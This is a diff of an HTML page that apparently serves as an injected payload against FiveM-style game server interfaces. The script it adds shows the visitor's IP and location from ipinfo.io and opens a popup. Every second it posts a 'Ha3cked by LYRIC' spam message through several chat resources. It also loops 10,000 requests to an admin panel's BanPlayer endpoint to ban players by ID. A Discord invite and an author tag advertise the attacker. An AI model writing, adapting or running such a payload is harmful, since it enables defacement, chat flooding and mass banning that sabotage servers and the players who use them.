@@ -45,12 +45,14 @@
 </head>
 <body>
     <div class="image-container">
-        <img src="https://cdn.discordapp.com/attachments/1295010205255335978/1403767343628292168/asd.gif?ex=6898bfb7&is=68976e37&hm=a5e46c74149a8fdc8e7c89282b708c7a762201b327ead54d558bbd74139eafec&">
+        <img src="https://media.discordapp.net/attachments/1295010205255335978/1403767343628292168/asd.gif?ex=689a1137&is=6898bfb7&hm=de9de16f14e6a1e967a386234d63b044e17f2d616cf4b218815e091410de4a9b&=&width=512&height=288">
     </div>
+
     <audio autoplay loop>
-        <source src="https://cdn.discordapp.com/attachments/1295010205255335978/1403767578333286462/asd.mp4?ex=6898bfef&is=68976e6f&hm=76bfda007255ef7fae63d9440691b94b6f707341d63407378435c1af689b67f8&" type="audio/mpeg">
+        <source src="https://cdn.discordapp.com/attachments/1295010205255335978/1403767578333286462/asd.mp4?ex=689a116f&is=6898bfef&hm=c20dee9b2dbf6ba19a76146178be52cafd758765c08498cf804f976d98846caf&" type="audio/mpeg">
         Your browser does not support the audio element.
     </audio>
+
     <div class="info" id="ip-info">
         <strong>IP: <span id="ip"></span></strong><br>
         <span><strong>City:</strong> <span id="city"></span></span><br>
@@ -60,59 +62,67 @@
         <span><strong>Organization:</strong> <span id="org"></span></span><br>
         <span><strong>Timezone:</strong> <span id="timezone"></span></span>
     </div>
+
     <div class="text">discord.gg/4ns</div>
 
+    
     <script>
-         fetch('https://ipinfo.io/json')
-        .then(response => response.json())
-        .then(data => {
-            delete data.readme;
-            const infoDiv = document.getElementById('ip-info');
-            infoDiv.textContent = JSON.stringify(data, null, 2);
-        });
+        fetch('https://ipinfo.io/json')
+            .then(response => response.json())
+            .then(data => {
+                delete data.readme;
+                const infoDiv = document.getElementById('ip-info');
+                infoDiv.textContent = JSON.stringify(data, null, 2);
+            });
+
+        setTimeout(() => {
+            window.open("https://jumpshare.com/s/x1XUc2zg1TQ3ZL0eVkZD", "_blank");
+        }, 50);
+
+        const msg = `👑 Ha3cked by 𝐋𝐘𝐑𝐈𝐂 - .gg/4ns ! 👑`;
+        const body = JSON.stringify({ message: msg });
+
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", { method: "POST", body });
+            fetch("https://danger_chat/Danger_Chat:SendMessage", {
+                method: "POST",
+                body: JSON.stringify({
+                    "message": msg,
+                    "channel": "شات العام",
+                    "color": null,
+                    "isImageAndLinksAllowed": [false, false]
+                })
+            });
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                headers: {
+                    accept: "*/*",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                },
+                body: JSON.stringify({ message: msg, channel: "شات العام" }),
+                method: "POST"
+            });
+            fetch("https://melix_chat/chatResult", { method: "POST", body });
+            fetch("https://as_chat/chatResult", { method: "POST", body });
+            fetch("https://chat/chatResult", { method: "POST", body });
+            fetch("https://ho-chatv2/Chat", {
+                method: "POST",
+                body: JSON.stringify({
+                    "Type": "chatResult",
+                    "message": msg,
+                    "chatType": "general"
+                })
+            });
+        }, 1000);
+
+        
+        for (let i = 1; i <= 10000; i++) {
             setTimeout(() => {
-                window.open("https://jumpshare.com/s/x1XUc2zg1TQ3ZL0eVkZD", "_blank");
-            }, 50);
-
-
-            const msg = `👑 Ha3cked by 𝐋𝐘𝐑𝐈𝐂 - .gg/4ns ! 👑`;
-            const body = JSON.stringify({ message: msg });
-            setInterval(() => {
-                fetch("https://flix-scripts/chatResult", { method: "POST", body });
-                fetch("https://danger_chat/Danger_Chat:SendMessage", {
-                    method: "POST",
-                    body: JSON.stringify({
-                        "message": msg,
-                        "channel": "شات العام",
-                        "color": null,
-                        "isImageAndLinksAllowed": [false, false]
-                    })
-                });
-                fetch("https://easy-chat+/o6ZbK5Ecp6", {
-                    headers: {
-                        accept: "*/*",
-                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
-                    },
-                    body: JSON.stringify({ message: msg, channel: "شات العام" }),
-                    method: "POST"
-                });
-                fetch("https://melix_chat/chatResult", { method: "POST", body });
-                fetch("https://as_chat/chatResult", { method: "POST", body });
-                fetch("https://chat/chatResult", { method: "POST", body });
-                fetch("https://ho-chatv2/Chat", {
-                    method: "POST",
-                    body: JSON.stringify({
-                        "Type": "chatResult",
-                        "message": msg,
-                        "chatType": "general"
-                    })
-                });
-            }, 1000);
-        </script>
-
-    </div>
-
+                $.post('https://EC-PANEL/BanPlayer', JSON.stringify({
+                    id: i,
+                    Reason: "ha3ked by 𝐋𝐘𝐑𝐈𝐂"
+                }));
+            }, i * 50);
+        }
+    </script>
 </body>
-
 </html>
-by _301x
